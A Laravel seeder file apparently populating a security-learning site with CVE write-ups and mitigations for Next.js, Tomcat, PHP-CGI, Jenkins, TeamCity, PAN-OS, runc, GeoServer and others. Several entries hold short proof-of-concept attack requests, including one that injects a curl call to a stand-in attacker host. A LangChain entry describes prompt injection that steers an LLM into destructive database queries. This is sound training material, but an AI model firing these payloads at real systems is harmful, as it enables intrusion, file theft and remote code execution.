<?php

namespace Database\Seeders;

use App\Models\Category;
use App\Models\CveArticle;
use App\Models\Lab;
use App\Models\User;
use Illuminate\Database\Seeder;

class CveSeeder extends Seeder
{
    public function run(): void
    {
        // Remove any previously seeded placeholder entry if re-running on an existing database
        CveArticle::where('cve_id', 'CVE-2026-10001')->delete();

        $ownerId = User::where('role', User::ROLE_OWNER)->value('id');
        $categories = Category::pluck('id')->all();
        $firstLabByCategory = [];
        foreach (Lab::orderBy('sort_order')->get(['id', 'category_id']) as $lab) {
            if (! isset($firstLabByCategory[$lab->category_id])) {
                $firstLabByCategory[$lab->category_id] = $lab->id;
            }
        }

        $items = [
            [
                'cve_id' => 'CVE-2025-29927',
                'cve_year' => 2025,
                'category_id' => 'access-control-vulnerabilities',
                'title' => 'Next.js Middleware Authorization Bypass via x-middleware-subrequest Header',
                'cvss_score' => 9.1,
                'severity' => 'CRITICAL',
                'affected_product' => 'Vercel Next.js (< 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3)',
                'summary' => 'Improper trust of the internal x-middleware-subrequest HTTP header allows external attackers to skip Next.js middleware execution entirely, bypassing authentication and access control checks.',
                'technical_analysis' => "Next.js uses the internal x-middleware-subrequest header to prevent infinite middleware recursion. When an incoming client request supplies this header containing the middleware module name (such as middleware or src/middleware), the runtime treats the request as an already-processed internal subrequest and skips authorization guards.",
                'poc_content' => "GET /admin HTTP/1.1\nHost: target.example.local\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware",
                'mitigation' => 'Upgrade Next.js to patched versions (15.2.3+, 14.2.25+, 13.5.9+, 12.3.5+) and strip x-middleware-subrequest headers at reverse-proxy / WAF edges.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2025/CVE-2025-29927.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2025-29927',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2025-24813',
                'cve_year' => 2025,
                'category_id' => 'insecure-deserialization',
                'title' => 'Apache Tomcat Path Equivalence & File-Based Session Deserialization RCE',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'Apache Tomcat 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2',
                'summary' => 'When partial PUT is enabled with file-based session persistence, attackers can upload serialized Java gadgets via PUT requests and trigger unsafe deserialization via JSESSIONID.',
                'technical_analysis' => "Path equivalence handling converts slashes into dots when writing partial PUT content under Tomcat's default servlet if readonly=false. Combining partial PUT uploads with Tomcat PersistentManager file storage enables uploading a serialized payload named <session>.session and triggering ObjectInputStream deserialization.",
                'poc_content' => "PUT /attacker.session HTTP/1.1\nHost: target.example.local\nContent-Range: bytes 0-100/101\n\n<serialized-gadget-bytes>\n\nGET / HTTP/1.1\nCookie: JSESSIONID=.attacker",
                'mitigation' => 'Upgrade Tomcat to 9.0.99+, 10.1.35+, or 11.0.3+. Keep DefaultServlet readonly=true and avoid storing untrusted Java objects via FileStore.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2025/CVE-2025-24813.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2025-24813',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-4577',
                'cve_year' => 2024,
                'category_id' => 'os-command-injection',
                'title' => 'PHP CGI Argument Injection on Windows via Best-Fit Character Mapping',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'PHP on Windows (8.3 < 8.3.8, 8.2 < 8.2.20, 8.1 < 8.1.29)',
                'summary' => 'Windows Best-Fit Unicode conversion maps soft hyphen (0xAD) to ASCII hyphen (0x2D) after PHP CGI sanitization, enabling arbitrary PHP-CGI CLI flags (-d auto_prepend_file) and RCE.',
                'technical_analysis' => "CVE-2012-1823 mitigations reject query parameters starting with '-'. However, on Windows locales (Simplified/Traditional Chinese, Japanese), the 0xAD byte passes Apache/PHP checks and is normalized to '-' before PHP CGI parses command-line flags, allowing php://input execution.",
                'poc_content' => "POST /cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\nHost: target.example.local\nContent-Type: application/x-www-form-urlencoded\n\n<?php system('whoami'); ?>",
                'mitigation' => 'Upgrade PHP to 8.3.8+, 8.2.20+, or 8.1.29+. Prefer PHP-FPM / mod_php over legacy php-cgi.exe on Windows.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-4577.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-4577',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-23897',
                'cve_year' => 2024,
                'category_id' => 'path-traversal',
                'title' => 'Jenkins CLI args4j Arbitrary File Read via @-Prefix Expansion',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'Jenkins <= 2.441, LTS <= 2.426.2',
                'summary' => 'Jenkins embeds the args4j library which replaces @/path/to/file arguments with file contents, allowing unauthenticated attackers to leak secrets and cryptographic keys.',
                'technical_analysis' => "The Jenkins CLI parser accepts arguments starting with '@' and expands them server-side from the filesystem before validating permissions on CLI subcommands like help or connect-node. Reading /var/jenkins_home/secrets/master.key can escalate to full admin takeover.",
                'poc_content' => "java -jar jenkins-cli.jar -s http://target.example.local:8080/ help \"@/etc/passwd\"",
                'mitigation' => 'Upgrade Jenkins to 2.442 or LTS 2.426.3+ where args4j file expansion is disabled by default.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-23897.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-23897',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-27198',
                'cve_year' => 2024,
                'category_id' => 'authentication',
                'title' => 'JetBrains TeamCity Authentication Bypass via Path Normalization & jsp Parameter',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'JetBrains TeamCity < 2023.11.4',
                'summary' => 'An alternative path handling flaw in TeamCity web routing allows unauthenticated attackers to bypass authentication filters and generate administrative API tokens.',
                'technical_analysis' => "By requesting an unauthenticated route such as /hax?jsp=/app/rest/users;.jsp, Spring/Tomcat dispatch forwards the request internally to the protected REST endpoint while bypassing the authentication interceptor.",
                'poc_content' => "POST /hax?jsp=/app/rest/users/id:1/tokens/pwned HTTP/1.1\nHost: target.example.local\nContent-Type: application/json",
                'mitigation' => 'Update TeamCity immediately to 2023.11.4 or newer and audit existing admin access tokens.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-27198.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-27198',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-3400',
                'cve_year' => 2024,
                'category_id' => 'os-command-injection',
                'title' => 'Palo Alto PAN-OS GlobalProtect Arbitrary File Creation & OS Command Injection',
                'cvss_score' => 10.0,
                'severity' => 'CRITICAL',
                'affected_product' => 'PAN-OS 10.2, 11.0, 11.1 (GlobalProtect Gateway/Portal)',
                'summary' => 'Unauthenticated command injection in PAN-OS GlobalProtect telemetry handling via SESSID cookie path traversal and shell metacharacters.',
                'technical_analysis' => "Supplying a SESSID cookie containing directory traversal creates files in arbitrary directories, while device telemetry cron jobs later parse filenames containing backtick command substitutions as root.",
                'poc_content' => "POST /ssl-vpn/hipreport.esp HTTP/1.1\nHost: target.example.local\nCookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/test`curl\${IFS}http://attacker.tld`",
                'mitigation' => 'Apply PAN-OS hotfixes and disable device telemetry until patched.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-3400.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-3400',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-50379',
                'cve_year' => 2024,
                'category_id' => 'race-conditions',
                'title' => 'Apache Tomcat TOCTOU Race Condition in Case-Insensitive JSP Compilation',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'Apache Tomcat 9.0.0.M1-9.0.97, 10.1.0-M1-10.1.33, 11.0.0-M1-11.0.1',
                'summary' => 'Time-of-check to time-of-use race condition during concurrent PUT uploads and GET requests on case-insensitive filesystems allows JSP execution leading to RCE.',
                'technical_analysis' => "When write operations are enabled on DefaultServlet on Windows/macOS, sending parallel PUT requests for shell.Jsp alongside concurrent GET requests for shell.jsp triggers a TOCTOU window where Tomcat compiles and executes the uploaded payload.",
                'poc_content' => "# Concurrent HTTP/2 single-packet race:\nPUT /poc.Jsp -> <% Runtime.getRuntime().exec(\"calc\"); %>\nGET /poc.jsp -> triggers compilation before cleanup",
                'mitigation' => 'Upgrade Tomcat to 9.0.98+, 10.1.34+, or 11.0.2+ and disable HTTP PUT writes in production.',
                'references_json' => [
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-50379.md',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-50379',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-45519',
                'cve_year' => 2024,
                'category_id' => 'os-command-injection',
                'title' => 'Zimbra Collaboration postjournal Unauthenticated OS Command Injection',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'Zimbra Collaboration Suite (8.8.15 < Patch 46, 9.0.0 < Patch 41, 10.0 < 10.0.9, 10.1 < 10.1.1)',
                'summary' => 'An unauthenticated command injection vulnerability in the postjournal service of Zimbra Collaboration allows remote attackers to execute arbitrary OS commands via crafted requests.',
                'technical_analysis' => 'Insufficient validation and sanitization of untrusted input processed by the Zimbra postjournal component permits shell metacharacter interpretation, enabling unauthenticated remote command execution.',
                'poc_content' => null,
                'mitigation' => 'Upgrade Zimbra Collaboration to 8.8.15 Patch 46, 9.0.0 Patch 41, 10.0.9, or 10.1.1+ and restrict network exposure of postjournal interfaces.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-45519',
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-45519.md',
                ],
                'is_hot' => false,
            ],
            [
                'cve_id' => 'CVE-2024-21626',
                'cve_year' => 2024,
                'category_id' => 'path-traversal',
                'title' => 'runc Container Breakout via File Descriptor Leak & Working Directory Traversal',
                'cvss_score' => 8.6,
                'severity' => 'HIGH',
                'affected_product' => 'opencontainers/runc <= 1.1.11',
                'summary' => 'Leaked internal file descriptor pointing to host /sys/fs/cgroup combined with WORKDIR /proc/self/fd/N allows container escape via host path traversal.',
                'technical_analysis' => "During container initialization, runc opened an internal file descriptor without O_CLOEXEC in all code paths. A malicious container image specifying WORKDIR /proc/self/fd/7 could retain access to the host filesystem outside the container rootfs.",
                'poc_content' => "FROM alpine\nWORKDIR /proc/self/fd/8\n# Traverse relative paths back to host /etc/shadow",
                'mitigation' => 'Update runc to >= 1.1.12 and Docker/containerd runtimes; verify container images from trusted registries.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-21626',
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-21626.md',
                ],
                'is_hot' => false,
            ],
            [
                'cve_id' => 'CVE-2024-36401',
                'cve_year' => 2024,
                'category_id' => 'os-command-injection',
                'title' => 'GeoServer / GeoTools OGC Property Name XPath Expression Evaluation RCE',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'OSGeo GeoServer (< 2.22.6, < 2.23.6, < 2.24.4, < 2.25.2)',
                'summary' => 'GeoTools evaluates propertyName parameters as XPath expressions via commons-jxpath without sufficient restriction, enabling unauthenticated remote code execution.',
                'technical_analysis' => 'Multiple OGC request types (WFS GetFeature, GetPropertyValue, WMS GetMap) pass attacker-controlled propertyName/valueReference inputs into Apache Commons JXPath evaluation even for simple feature types, allowing arbitrary Java method invocation.',
                'poc_content' => "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id') HTTP/1.1",
                'mitigation' => 'Upgrade GeoServer to 2.25.2, 2.24.4, 2.23.6, or 2.22.6+ and avoid running GeoServer with unnecessary OS privileges.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-36401',
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-36401.md',
                ],
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-28995',
                'cve_year' => 2024,
                'category_id' => 'path-traversal',
                'title' => 'SolarWinds Serv-U Unauthenticated Directory Traversal File Read',
                'cvss_score' => 7.5,
                'severity' => 'HIGH',
                'affected_product' => 'SolarWinds Serv-U (<= 15.4.2 HF 1)',
                'summary' => 'A directory traversal vulnerability in SolarWinds Serv-U web file transfer handling allows unauthenticated remote attackers to read arbitrary files from the underlying host.',
                'technical_analysis' => 'Improper path canonicalization when processing InternalDir and InternalFile request parameters permits directory traversal sequences outside the intended web root.',
                'poc_content' => null,
                'mitigation' => 'Upgrade SolarWinds Serv-U to 15.4.2 Hotfix 2 (HF 2) or later immediately and monitor HTTP logs for traversal attempts.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-28995',
                    'https://github.com/trickest/cve/blob/main/2024/CVE-2024-28995.md',
                ],
                'is_hot' => false,
            ],
            [
                'cve_id' => 'CVE-2025-64459',
                'cve_year' => 2025,
                'category_id' => 'sql-injection',
                'title' => 'Django ORM QuerySet _connector / _negated Dictionary Expansion SQL Injection',
                'cvss_score' => 9.1,
                'severity' => 'CRITICAL',
                'affected_product' => 'Django (< 4.2.26, < 5.1.14, < 5.2.8)',
                'summary' => 'QuerySet.filter(), exclude(), get(), and Q() are vulnerable to SQL injection when untrusted user dictionaries are expanded via **kwargs containing _connector or _negated keys.',
                'technical_analysis' => 'When applications unpack user-supplied dictionaries directly into Django ORM lookups (such as Model.objects.filter(**params)), attackers can supply internal control keys like _connector to alter the generated SQL logical operators.',
                'poc_content' => null,
                'mitigation' => 'Upgrade Django to 4.2.26+, 5.1.14+, or 5.2.8+, and strictly allowlist dictionary keys before passing parameters to ORM QuerySet methods.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2025-64459',
                ],
                'source_repo' => 'nvd',
                'is_hot' => true,
            ],
            [
                'cve_id' => 'CVE-2024-20362',
                'cve_year' => 2024,
                'category_id' => 'cross-site-scripting',
                'title' => 'Cisco Small Business RV Series Web Management Interface Cross-Site Scripting',
                'cvss_score' => 6.1,
                'severity' => 'MEDIUM',
                'affected_product' => 'Cisco Small Business RV016, RV042, RV042G, RV082, RV320, RV325',
                'summary' => 'Insufficient input validation in the web-based management interface of Cisco Small Business RV Series routers allows unauthenticated remote attackers to execute arbitrary script in an authenticated user browser.',
                'technical_analysis' => 'Untrusted request parameters rendered in the management interface without context-appropriate encoding permit cross-site scripting (CWE-79) when an administrator visits a crafted link.',
                'poc_content' => null,
                'mitigation' => 'Restrict management interface access to trusted administrative networks and apply vendor updates or migrate to supported router hardware.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-20362',
                ],
                'source_repo' => 'nvd',
                'is_hot' => false,
            ],
            [
                'cve_id' => 'CVE-2024-34351',
                'cve_year' => 2024,
                'category_id' => 'server-side-request-forgery-ssrf',
                'title' => 'Next.js Server Actions Host Header Server-Side Request Forgery (SSRF)',
                'cvss_score' => 7.5,
                'severity' => 'HIGH',
                'affected_product' => 'Vercel Next.js (< 14.1.1, self-hosted)',
                'summary' => 'Self-hosted Next.js applications using Server Actions with relative redirects can be tricked via Host header manipulation into issuing server-side requests to attacker-specified hosts.',
                'technical_analysis' => 'When a Next.js Server Action returns a redirect to a relative path starting with a forward slash, internal action handling resolves the target using the incoming Host header, enabling SSRF on self-hosted deployments.',
                'poc_content' => null,
                'mitigation' => 'Upgrade Next.js to 14.1.1 or later and validate Host headers at the reverse proxy layer.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-34351',
                ],
                'source_repo' => 'nvd',
                'is_hot' => false,
            ],
            [
                'cve_id' => 'CVE-2024-8309',
                'cve_year' => 2024,
                'category_id' => 'web-llm-attacks',
                'title' => 'LangChain GraphCypherQAChain Prompt Injection Leading to Cypher/SQL Injection',
                'cvss_score' => 9.8,
                'severity' => 'CRITICAL',
                'affected_product' => 'langchain-ai/langchain (0.2.5)',
                'summary' => 'A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain allows prompt injection to produce unauthorized Cypher/SQL queries, leading to data manipulation, data exfiltration, or denial of service.',
                'technical_analysis' => "GraphCypherQAChain translates natural language user input into database queries using an LLM prompt template before executing them against a graph database. Insufficient isolation and validation of untrusted prompts allow attackers to steer the LLM into emitting unauthorized read or destructive write queries (such as CREATE, SET, or DELETE statements).",
                'poc_content' => null,
                'mitigation' => 'Upgrade langchain / langchain-community to patched versions, run graph database connections under least-privilege read-only accounts when writes are unnecessary, and enforce query allowlist/AST checks before executing LLM-generated queries.',
                'references_json' => [
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-8309',
                ],
                'source_repo' => 'nvd',
                'is_hot' => false,
            ],
        ];

        $now = now();
        foreach ($items as $item) {
            $catId = in_array($item['category_id'], $categories, true) ? $item['category_id'] : null;
            $labId = $catId ? ($firstLabByCategory[$catId] ?? null) : null;

            CveArticle::updateOrCreate(
                ['cve_id' => $item['cve_id']],
                [
                    'slug' => strtolower($item['cve_id']),
                    'cve_year' => $item['cve_year'],
                    'category_id' => $catId,
                    'lab_id' => $labId,
                    'title' => $item['title'],
                    'cvss_score' => $item['cvss_score'],
                    'severity' => $item['severity'],
                    'affected_product' => $item['affected_product'],
                    'summary' => $item['summary'],
                    'technical_analysis' => $item['technical_analysis'],
                    'poc_content' => $item['poc_content'] ?? null,
                    'mitigation' => $item['mitigation'],
                    'references_json' => $item['references_json'],
                    'source_repo' => $item['source_repo'] ?? 'trickest/cve',
                    'is_hot' => $item['is_hot'],
                    'status' => 'published',
                    'author_id' => $ownerId,
                    'published_at' => $now,
                ]
            );
        }
    }
}
